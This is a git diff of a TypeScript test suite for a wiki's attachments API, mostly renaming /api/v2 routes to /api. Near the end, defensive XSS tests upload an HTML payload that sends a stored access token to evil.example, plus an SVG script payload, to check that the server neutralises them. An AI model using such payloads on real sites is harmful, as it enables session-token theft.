@@ -17,7 +17,7 @@ const cleanupPathPrefix = async (prefix: string) => {
   await Promise.all([Page.deleteMany(filter), Revision.deleteMany(filter), Attachment.deleteMany({ page: { $in: pageIds } })]);
 };
 
-describe('Routes /api/v2 attachments (Hono)', () => {
+describe('Routes /api attachments (Hono)', () => {
   const PATH_PREFIX = '/hono-attachment-test/';
   let accessToken: string;
   let otherAccessToken: string;
@@ -73,39 +73,39 @@ describe('Routes /api/v2 attachments (Hono)', () => {
 
   afterEach(() => cleanupPathPrefix(PATH_PREFIX));
 
-  describe('GET /api/v2/pages/:pageId/attachments (list)', () => {
+  describe('GET /api/pages/:pageId/attachments (list)', () => {
     it('returns 401 without auth', async () => {
-      const res = await request(app).get('/api/v2/pages/000000000000000000000000/attachments');
+      const res = await request(app).get('/api/pages/000000000000000000000000/attachments');
       expect(res.status).toBe(401);
       expect(res.body.error.code).toBe('AUTHENTICATION_REQUIRED');
     });
 
     it('returns 400 when pageId is malformed', async () => {
-      const res = await request(app).get('/api/v2/pages/not-an-objectid/attachments').set(authHeaders(accessToken));
+      const res = await request(app).get('/api/pages/not-an-objectid/attachments').set(authHeaders(accessToken));
       expect(res.status).toBe(400);
       expect(res.body.error.code).toBe('INVALID_PAGE_ID');
     });
 
     it('returns 404 when the user has no grant on the page', async () => {
       const ownerCreate = await createPageViaApi(accessToken, `${PATH_PREFIX}private-list`, '# secret', 4 /* GRANT_OWNER */);
-      const res = await request(app).get(`/api/v2/pages/${ownerCreate._id}/attachments`).set(authHeaders(otherAccessToken));
+      const res = await request(app).get(`/api/pages/${ownerCreate._id}/attachments`).set(authHeaders(otherAccessToken));
       expect(res.status).toBe(404);
       expect(res.body.error.code).toBe('PAGE_NOT_FOUND');
     });
 
     it('returns an empty list for a public page with no attachments', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}empty-list`, '# nope');
-      const res = await request(app).get(`/api/v2/pages/${page._id}/attachments`).set(authHeaders(accessToken));
+      const res = await request(app).get(`/api/pages/${page._id}/attachments`).set(authHeaders(accessToken));
       expect(res.status).toBe(200);
       expect(res.body.attachments).toEqual([]);
     });
   });
 
-  describe('GET /api/v2/pages/:pageId/attachments — inUse detection (Phase 7)', () => {
+  describe('GET /api/pages/:pageId/attachments — inUse detection (Phase 7)', () => {
     /** Upload a PNG to a page and return its attachment id. */
     const uploadTo = async (pageId: string) => {
       const res = await request(app)
-        .post(`/api/v2/pages/${pageId}/attachments`)
+        .post(`/api/pages/${pageId}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(res.status).toBe(200);
@@ -127,7 +127,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     };
 
     const listOf = async (pageId: string) => {
-      const res = await request(app).get(`/api/v2/pages/${pageId}/attachments`).set(authHeaders(accessToken));
+      const res = await request(app).get(`/api/pages/${pageId}/attachments`).set(authHeaders(accessToken));
       expect(res.status).toBe(200);
       return res.body.attachments as Array<{ _id: string; inUse: boolean }>;
     };
@@ -175,7 +175,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('reports inUse=false on the addAttachment (upload) response — a fresh upload is not yet referenced', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}inuse-upload-resp`, '# x');
       const res = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(res.status).toBe(200);
@@ -183,11 +183,11 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     });
   });
 
-  describe('GET /api/v2/pages/:pageId/attachments/usage (Phase 8)', () => {
+  describe('GET /api/pages/:pageId/attachments/usage (Phase 8)', () => {
     /** Upload a PNG to a page and return its attachment id. */
     const uploadTo = async (pageId: string) => {
       const res = await request(app)
-        .post(`/api/v2/pages/${pageId}/attachments`)
+        .post(`/api/pages/${pageId}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(res.status).toBe(200);
@@ -232,7 +232,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     };
 
     const usageOf = async (pageId: string) => {
-      const res = await request(app).get(`/api/v2/pages/${pageId}/attachments/usage`).set(authHeaders(accessToken));
+      const res = await request(app).get(`/api/pages/${pageId}/attachments/usage`).set(authHeaders(accessToken));
       expect(res.status).toBe(200);
       return res.body as {
         pagePath: string;
@@ -242,20 +242,20 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     };
 
     it('returns 401 without auth', async () => {
-      const res = await request(app).get('/api/v2/pages/000000000000000000000000/attachments/usage');
+      const res = await request(app).get('/api/pages/000000000000000000000000/attachments/usage');
       expect(res.status).toBe(401);
       expect(res.body.error.code).toBe('AUTHENTICATION_REQUIRED');
     });
 
     it('returns 400 when pageId is malformed', async () => {
-      const res = await request(app).get('/api/v2/pages/not-an-objectid/attachments/usage').set(authHeaders(accessToken));
+      const res = await request(app).get('/api/pages/not-an-objectid/attachments/usage').set(authHeaders(accessToken));
       expect(res.status).toBe(400);
       expect(res.body.error.code).toBe('INVALID_PAGE_ID');
     });
 
     it('returns 404 when the user has no grant on the page', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}usage-private`, '# secret', 4 /* GRANT_OWNER */);
-      const res = await request(app).get(`/api/v2/pages/${page._id}/attachments/usage`).set(authHeaders(otherAccessToken));
+      const res = await request(app).get(`/api/pages/${page._id}/attachments/usage`).set(authHeaders(otherAccessToken));
       expect(res.status).toBe(404);
       expect(res.body.error.code).toBe('PAGE_NOT_FOUND');
     });
@@ -345,10 +345,10 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     });
   });
 
-  describe('POST /api/v2/pages/:pageId/attachments (add)', () => {
+  describe('POST /api/pages/:pageId/attachments (add)', () => {
     it('returns 401 without auth', async () => {
       const res = await request(app)
-        .post('/api/v2/pages/000000000000000000000000/attachments')
+        .post('/api/pages/000000000000000000000000/attachments')
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(res.status).toBe(401);
       expect(res.body.error.code).toBe('AUTHENTICATION_REQUIRED');
@@ -356,14 +356,14 @@ describe('Routes /api/v2 attachments (Hono)', () => {
 
     it('returns 400 when no file is provided', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}no-file`, '# x');
-      const res = await request(app).post(`/api/v2/pages/${page._id}/attachments`).set(authHeaders(accessToken));
+      const res = await request(app).post(`/api/pages/${page._id}/attachments`).set(authHeaders(accessToken));
       expect(res.status).toBe(400);
       expect(res.body.error.code).toBe('FILE_MISSING');
     });
 
     it('returns 404 when the page does not exist', async () => {
       const res = await request(app)
-        .post('/api/v2/pages/000000000000000000000000/attachments')
+        .post('/api/pages/000000000000000000000000/attachments')
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(res.status).toBe(404);
@@ -374,7 +374,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}upload`, '# add');
 
       const res = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
 
@@ -401,7 +401,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
 
         const spy = jest.spyOn(imageDisplayDerivative, 'generateDisplayDerivativeForUpload');
         const res = await request(app)
-          .post(`/api/v2/pages/${page._id}/attachments`)
+          .post(`/api/pages/${page._id}/attachments`)
           .set(authHeaders(accessToken))
           .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });
 
@@ -423,7 +423,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
         const garbage = Buffer.from('this is not a real png, just garbage bytes for the upload test');
 
         const res = await request(app)
-          .post(`/api/v2/pages/${page._id}/attachments`)
+          .post(`/api/pages/${page._id}/attachments`)
           .set(authHeaders(accessToken))
           .attach('file', garbage, { filename: 'not-a-png.png', contentType: 'image/png' });
 
@@ -438,14 +438,14 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     });
   });
 
-  describe('GET /api/v2/attachments/:id (raw stream)', () => {
+  describe('GET /api/attachments/:id (raw stream)', () => {
     it('returns 401 without auth', async () => {
-      const res = await request(app).get('/api/v2/attachments/000000000000000000000000');
+      const res = await request(app).get('/api/attachments/000000000000000000000000');
       expect(res.status).toBe(401);
     });
 
     it('serves the file-not-found placeholder for a non-existent attachment record', async () => {
-      const res = await request(app).get('/api/v2/attachments/000000000000000000000000').set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get('/api/attachments/000000000000000000000000').set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
       expect(res.status).toBe(200);
       expect(res.headers['content-type']).toBe('image/png');
@@ -457,7 +457,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('serves the placeholder when the backing file is missing (local ENOENT)', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}enoent`, '# e');
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
@@ -471,7 +471,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       if (!driver) throw new Error('storage driver missing in test env');
       await driver.delete(stored.filePath);
 
-      const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
       expect(res.status).toBe(200);
       expect(res.headers['content-type']).toBe('image/png');
@@ -482,7 +482,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('serves the placeholder when the storage driver throws a NoSuchKey error (S3)', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}nosuchkey`, '# s3');
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
@@ -509,7 +509,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       });
 
       try {
-        const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+        const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
         expect(res.status).toBe(200);
         expect(res.headers['content-type']).toBe('image/png');
@@ -523,13 +523,13 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('returns 404 (not the placeholder) when the caller lacks grant on the page', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}grant-fail`, '# secret', 4 /* GRANT_OWNER */);
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
       const id = upload.body.attachment._id;
 
-      const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(otherAccessToken));
+      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(otherAccessToken));
       expect(res.status).toBe(404);
       expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
     });
@@ -537,14 +537,14 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('streams the uploaded bytes back', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}stream`, '# st');
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
 
       const id = upload.body.attachment._id;
       const res = await request(app)
-        .get(`/api/v2/attachments/${id}`)
+        .get(`/api/attachments/${id}`)
         .set(authHeaders(accessToken))
         .buffer(true)
         .parse((response, callback) => {
@@ -567,7 +567,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
         const page = await createPageViaApi(accessToken, `${PATH_PREFIX}display-priority`, '# dp');
         const wideJpeg = await createWideJpeg();
         const upload = await request(app)
-          .post(`/api/v2/pages/${page._id}/attachments`)
+          .post(`/api/pages/${page._id}/attachments`)
           .set(authHeaders(accessToken))
           .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });
         expect(upload.status).toBe(200);
@@ -585,7 +585,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
         for await (const chunk of derivativeStream) derivativeChunks.push(chunk as Buffer);
         const derivativeBytes = Buffer.concat(derivativeChunks);
 
-        const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+        const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
         expect(res.status).toBe(200);
         // A valid MIME string ('image/jpeg'), NOT the sharp decoder identifier ('jpeg') — §6/AC1.
@@ -601,7 +601,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
         const page = await createPageViaApi(accessToken, `${PATH_PREFIX}display-fallback-failed`, '# ff');
         const garbage = Buffer.from('this is not a real png, just garbage bytes for the delivery test');
         const upload = await request(app)
-          .post(`/api/v2/pages/${page._id}/attachments`)
+          .post(`/api/pages/${page._id}/attachments`)
           .set(authHeaders(accessToken))
           .attach('file', garbage, { filename: 'not-a-png.png', contentType: 'image/png' });
         expect(upload.status).toBe(200);
@@ -611,7 +611,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
         const stored = await Attachment.findById(id);
         expect(stored?.derivatives?.display?.mode).toBe('failed');
 
-        const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+        const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
         expect(res.status).toBe(200);
         expect(res.headers['content-type']).toBe('image/png');
@@ -623,7 +623,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
         const page = await createPageViaApi(accessToken, `${PATH_PREFIX}display-fallback-missing`, '# fm');
         const wideJpeg = await createWideJpeg();
         const upload = await request(app)
-          .post(`/api/v2/pages/${page._id}/attachments`)
+          .post(`/api/pages/${page._id}/attachments`)
           .set(authHeaders(accessToken))
           .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });
         expect(upload.status).toBe(200);
@@ -643,7 +643,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
         if (!driver) throw new Error('storage driver missing in test env');
         await driver.delete(derivativeFilePath);
 
-        const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+        const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
         expect(res.status).toBe(200);
         expect(res.headers['content-type']).toBe('image/jpeg');
@@ -655,7 +655,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
         const page = await createPageViaApi(accessToken, `${PATH_PREFIX}display-fallback-nosuchkey`, '# fn');
         const wideJpeg = await createWideJpeg();
         const upload = await request(app)
-          .post(`/api/v2/pages/${page._id}/attachments`)
+          .post(`/api/pages/${page._id}/attachments`)
           .set(authHeaders(accessToken))
           .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });
         expect(upload.status).toBe(200);
@@ -684,7 +684,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
         });
 
         try {
-          const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+          const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
           expect(res.status).toBe(200);
           expect(res.headers['content-type']).toBe('image/jpeg');
           const received = res.body as Buffer;
@@ -697,7 +697,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       it('/attachments/:id itself still has no scope check — a pages:read-only OAuth token can access it (pre-existing gap, unchanged by this feature — spec §3)', async () => {
         const page = await createPageViaApi(accessToken, `${PATH_PREFIX}no-scope-gap`, '# gap');
         const upload = await request(app)
-          .post(`/api/v2/pages/${page._id}/attachments`)
+          .post(`/api/pages/${page._id}/attachments`)
           .set(authHeaders(accessToken))
           .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
         expect(upload.status).toBe(200);
@@ -706,24 +706,20 @@ describe('Routes /api/v2 attachments (Hono)', () => {
         const scoped = await createTestUser({ name: 'Attach No Scope Gap', username: 'attachNoScopeGap', email: 'attach-no-scope-gap@example.com' });
         const oauthToken = createJwtUtil(crowi).signOauthAccessToken({ user: scoped.user, scopes: ['pages:read'], clientId: 'crowi-cli' });
 
-        const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(oauthToken));
+        const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(oauthToken));
         expect(res.status).toBe(200);
       });
     });
   });
 
-  describe('GET /api/v2/attachments/:id/original (raw stream, always original — feature-image-derivative-optimization Phase 2)', () => {
+  describe('GET /api/attachments/:id/original (raw stream, always original — feature-image-derivative-optimization Phase 2)', () => {
     it('returns 401 without auth', async () => {
-      const res = await request(app).get('/api/v2/attachments/000000000000000000000000/original');
+      const res = await request(app).get('/api/attachments/000000000000000000000000/original');
       expect(res.status).toBe(401);
     });
 
     it('serves the file-not-found placeholder for a non-existent attachment record', async () => {
-      const res = await request(app)
-        .get('/api/v2/attachments/000000000000000000000000/original')
-        .set(authHeaders(accessToken))
-        .buffer(true)
-        .parse(bufferParser);
+      const res = await request(app).get('/api/attachments/000000000000000000000000/original').set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
       expect(res.status).toBe(200);
       expect(res.headers['content-type']).toBe('image/png');
@@ -734,13 +730,13 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('returns 404 (not the placeholder) when the caller lacks grant on the page', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-grant-fail`, '# secret', 4 /* GRANT_OWNER */);
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
       const id = upload.body.attachment._id;
 
-      const res = await request(app).get(`/api/v2/attachments/${id}/original`).set(authHeaders(otherAccessToken));
+      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(otherAccessToken));
       expect(res.status).toBe(404);
       expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
     });
@@ -748,7 +744,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('serves the placeholder when the backing original file is missing (local ENOENT)', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-enoent`, '# oe');
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
@@ -760,7 +756,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       if (!driver) throw new Error('storage driver missing in test env');
       await driver.delete(stored.filePath);
 
-      const res = await request(app).get(`/api/v2/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
       expect(res.status).toBe(200);
       expect(res.headers['content-type']).toBe('image/png');
@@ -772,7 +768,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-ignores-display`, '# oid');
       const wideJpeg = await createWideJpeg();
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });
       expect(upload.status).toBe(200);
@@ -782,7 +778,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const stored = await Attachment.findById(id);
       expect(stored?.derivatives?.display?.mode).toBe('resized');
 
-      const res = await request(app).get(`/api/v2/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
       expect(res.status).toBe(200);
       expect(res.headers['content-type']).toBe('image/jpeg');
@@ -793,13 +789,13 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('Content-Disposition is inline with originalName, same as /attachments/:id', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-disposition`, '# od');
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'my pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
       const id = upload.body.attachment._id;
 
-      const res = await request(app).get(`/api/v2/attachments/${id}/original`).set(authHeaders(accessToken));
+      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(accessToken));
       expect(res.status).toBe(200);
       expect(res.headers['content-disposition']).toBe(`inline; filename*=UTF-8''${encodeURIComponent('my pixel.png')}`);
     });
@@ -807,7 +803,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('403 INSUFFICIENT_SCOPE for a pages:read-only OAuth token (requires attachments:read explicitly, §3)', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-scope-insufficient`, '# scope');
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
@@ -816,7 +812,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const scoped = await createTestUser({ name: 'Attach Scope Read', username: 'attachOriginalScopeRead', email: 'attach-original-scope-read@example.com' });
       const oauthToken = createJwtUtil(crowi).signOauthAccessToken({ user: scoped.user, scopes: ['pages:read'], clientId: 'crowi-cli' });
 
-      const res = await request(app).get(`/api/v2/attachments/${id}/original`).set(authHeaders(oauthToken));
+      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(oauthToken));
       expect(res.status).toBe(403);
       expect(res.body.error.code).toBe('INSUFFICIENT_SCOPE');
     });
@@ -824,7 +820,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('200 for an attachments:read-scoped OAuth token', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-scope-sufficient`, '# scope-ok');
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
@@ -833,7 +829,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const scoped = await createTestUser({ name: 'Attach Scope Ok', username: 'attachOriginalScopeOk', email: 'attach-original-scope-ok@example.com' });
       const oauthToken = createJwtUtil(crowi).signOauthAccessToken({ user: scoped.user, scopes: ['attachments:read'], clientId: 'crowi-cli' });
 
-      const res = await request(app).get(`/api/v2/attachments/${id}/original`).set(authHeaders(oauthToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(oauthToken)).buffer(true).parse(bufferParser);
       expect(res.status).toBe(200);
       expect((res.body as Buffer).equals(pngBuffer)).toBe(true);
     });
@@ -841,19 +837,19 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('200 for a web-session token (ALL_SCOPES) — unaffected by the new scope requirement', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}original-scope-web`, '# scope-web');
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
       const id = upload.body.attachment._id;
 
-      const res = await request(app).get(`/api/v2/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
       expect(res.status).toBe(200);
       expect((res.body as Buffer).equals(pngBuffer)).toBe(true);
     });
   });
 
-  describe('GET /api/v2/attachments/by-key/:key (raw stream)', () => {
+  describe('GET /api/attachments/by-key/:key (raw stream)', () => {
     const tmpFiles: string[] = [];
 
     afterEach(() => {
@@ -883,12 +879,12 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     };
 
     it('returns 401 without auth', async () => {
-      const res = await request(app).get('/api/v2/attachments/by-key/user/anything.png');
+      const res = await request(app).get('/api/attachments/by-key/user/anything.png');
       expect(res.status).toBe(401);
     });
 
     it('returns 403 for keys outside the user/ prefix (e.g. attachment/...)', async () => {
-      const res = await request(app).get('/api/v2/attachments/by-key/attachment/abc/foo.png').set(authHeaders(accessToken));
+      const res = await request(app).get('/api/attachments/by-key/attachment/abc/foo.png').set(authHeaders(accessToken));
       expect(res.status).toBe(403);
       expect(res.body.error.code).toBe('FORBIDDEN_FOR_DELETE');
     });
@@ -898,7 +894,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       await seedKey(userKey, pngBuffer);
 
       const res = await request(app)
-        .get(`/api/v2/attachments/by-key/${encodeURIComponent(userKey)}`)
+        .get(`/api/attachments/by-key/${encodeURIComponent(userKey)}`)
         .set(authHeaders(accessToken))
         .buffer(true)
         .parse((response, callback) => {
@@ -917,7 +913,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
 
     it('returns 404 when the key does not exist', async () => {
       const res = await request(app)
-        .get(`/api/v2/attachments/by-key/${encodeURIComponent('user/missing-' + Date.now() + '.png')}`)
+        .get(`/api/attachments/by-key/${encodeURIComponent('user/missing-' + Date.now() + '.png')}`)
         .set(authHeaders(accessToken));
       expect(res.status).toBe(404);
       expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
@@ -940,7 +936,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     const uploadDeclaring = async (slug: string, body: Buffer, filename: string, contentType: string): Promise<string> => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}${slug}`, '# x');
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', body, { filename, contentType });
       expect(upload.status).toBe(200);
@@ -951,7 +947,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const html = Buffer.from('<script>fetch("https://evil.example/?t="+localStorage.getItem("crowi:accessToken"))</script>');
       const id = await uploadDeclaring(`xss-html-${Date.now()}`, html, 'payload.html', 'text/html');
 
-      const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
       expect(res.status).toBe(200);
       expect(res.headers['content-type']).toBe('application/octet-stream');
@@ -968,7 +964,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const Attachment = crowi.model('Attachment');
       await Attachment.collection.updateOne({ _id: new Types.ObjectId(id) }, { $set: { fileFormat: 12345 } });
 
-      const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
       expect(res.status).toBe(200);
       expect(res.headers['content-type']).toBe('application/octet-stream');
@@ -998,7 +994,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>');
       const id = await uploadDeclaring(`xss-svg-${Date.now()}`, svg, 'payload.svg', 'image/svg+xml');
 
-      const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
       expect(res.status).toBe(200);
       expect(res.headers['content-type']).toBe('image/svg+xml');
@@ -1009,7 +1005,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('never sandboxes the download branch (a sandbox without allow-downloads blocks the download itself)', async () => {
       const id = await uploadDeclaring(`xss-dl-${Date.now()}`, Buffer.from('PKzip'), 'a.zip', 'application/zip');
 
-      const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
       expect(res.headers['content-type']).toBe('application/octet-stream');
       expect(res.headers['content-disposition']).toMatch(/^attachment;/);
@@ -1024,7 +1020,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
         const Attachment = crowi.model('Attachment');
